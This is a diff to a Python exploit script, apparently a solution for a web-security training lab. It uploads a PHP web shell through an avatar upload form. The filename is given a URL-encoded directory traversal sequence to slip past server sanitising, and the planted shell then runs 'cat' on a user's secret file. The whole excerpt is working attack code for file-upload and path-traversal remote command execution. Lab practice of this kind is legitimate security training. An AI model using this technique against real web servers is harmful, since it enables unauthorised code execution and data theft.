@@ -48,7 +48,8 @@ if __name__ == "__main__":
         files={
             # File Tuple Syntax: (filename, file-content, content-type)
             "avatar": (
-                "web-shell.php",
+                # NOTE: Change the filename to include a directory traversal sequence (URL Encoded since the server is stripping the directory traversal sequence from the file name)
+                "..%2fweb-shell.php",
                 WEBSHELL,
                 "application/x-php",
             )
@@ -58,7 +59,8 @@ if __name__ == "__main__":
     if avatar_file_upload_response.ok:
         get_flag(
             SESSION.get(
-                url=f"{lab_url}/files/avatars/web-shell.php?command=cat /home/carlos/secret"
+                # NOTE: Updated filepath according to directory traversal attack path
+                url=f"{lab_url}/files/web-shell.php?command=cat /home/carlos/secret"
             ).text
         )
 
